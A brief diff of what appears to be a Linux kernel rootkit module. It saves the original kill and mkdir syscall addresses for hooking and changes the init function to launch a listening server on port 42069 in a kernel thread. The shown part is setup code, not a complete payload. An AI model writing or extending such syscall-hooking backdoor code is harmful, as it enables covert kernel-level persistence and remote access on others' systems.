@@ -31,7 +31,11 @@ static int __init ModuleInit(void) {
 	orig_kill = sys_kill.orig_syscall; //sets orig_kill to original syscall adress
 	orig_mkdir = sys_mkdir.orig_syscall; //sets orig_mkdir to original syscall adress
 	//orig_execve = sys_execve.orig_syscall; //sets orig_execve to original syscall adress
-	return run_server(42069);
+
+	int port = 42069; //sets the port to set
+
+	kthread_run(run_server, (void *) port, "server"); //runs the server
+	return 0;
 }
 
 
